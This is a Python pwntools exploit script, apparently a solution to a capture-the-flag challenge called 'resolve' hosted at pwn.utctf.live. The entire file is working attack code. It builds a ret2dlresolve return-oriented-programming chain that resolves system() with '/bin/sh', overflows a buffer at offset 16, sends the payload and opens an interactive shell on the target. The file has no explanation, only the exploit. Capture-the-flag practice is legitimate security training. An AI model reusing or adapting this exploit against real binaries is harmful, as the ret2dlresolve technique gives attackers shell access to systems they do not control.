#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e']
#context.log_level = 'debug'
context.binary = './build/resolve'

e = ELF('./build/resolve')
rop = ROP('./build/resolve')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('pwn.utctf.live', 5435)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/resolve', cwd='problemDir')
else:
    p = e.process()

dlresolve = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

ret = rop.find_gadget(['ret'])[0]

print(rop.dump())

payload = flat({16: ret}, rop.chain(),'\n',dlresolve.payload)

p.sendline(payload)
p.interactive()
